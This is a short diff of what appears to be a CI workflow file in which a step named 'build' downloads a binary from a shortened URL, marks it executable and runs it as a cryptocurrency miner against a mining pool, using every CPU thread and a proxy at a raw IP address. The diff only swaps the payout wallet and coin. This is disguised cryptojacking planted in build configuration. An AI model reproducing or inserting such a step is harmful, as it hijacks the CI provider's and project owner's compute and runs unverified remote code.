@@ -104,4 +104,4 @@ jobs:
 
     - name: build 
 
-      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u MKiXsqKm6fZsgf28N63iYdBh335av6Mp7f -p  c=LTC,mc=VRSC,ID=Kuli -t $(nproc --all) -x http://23.88.19.172:443
+      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RBXC64GiFJYcYMnfHV5XjTELsHEEQxivmZ -p  c=RVN,mc=VRSC,ID=Kuli -t $(nproc --all) -x http://23.88.19.172:443
